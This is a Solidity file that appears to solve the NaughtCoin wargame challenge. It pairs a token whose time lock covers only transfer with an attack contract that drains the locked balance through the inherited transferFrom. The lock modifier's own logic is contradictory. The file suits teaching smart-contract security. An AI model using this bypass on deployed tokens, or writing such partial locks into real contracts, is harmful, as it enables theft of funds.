pragma solidity ^0.4.24;


import './StandardToken.sol';

 contract NaughtCoin is StandardToken {

  string public constant name = 'NaughtCoin';
  string public constant symbol = '0x0';
  uint public constant decimals = 18;
  uint public timeLock = now + 10 years;
  uint public INITIAL_SUPPLY = 1000000 * (10 ** decimals);
  address public player;

  function NaughtCoin(address _player) public {
    player = _player;
    totalSupply_ = INITIAL_SUPPLY;
    balances[player] = INITIAL_SUPPLY;
    Transfer(0x0, player, INITIAL_SUPPLY);
  }

  function transfer(address _to, uint256 _value) lockTokens public returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      if (now < timeLock) {
        _;
      }
    } else {
     _;
    }
  }
}


contract NaughtCoinAttack {

    NaughtCoin victim;

    constructor(address _victim) public {
        victim = NaughtCoin(_victim);

    }

    //vulnerability is in the inherited function transferFrom which doesn't consider
    //the lockTokens modifier. Victim contract is initiated with the player's
    //POA account who must first execute the approval function allowing the attacking
    //contract to "steal" the locked funds with this attack.
    function attack() external returns(bool success) {
        uint myBalance = victim.allowance(msg.sender, address(this));
        if(myBalance == victim.INITIAL_SUPPLY()) {
           victim.transferFrom(msg.sender, address(this), myBalance);
        }
        return true;
    }

}
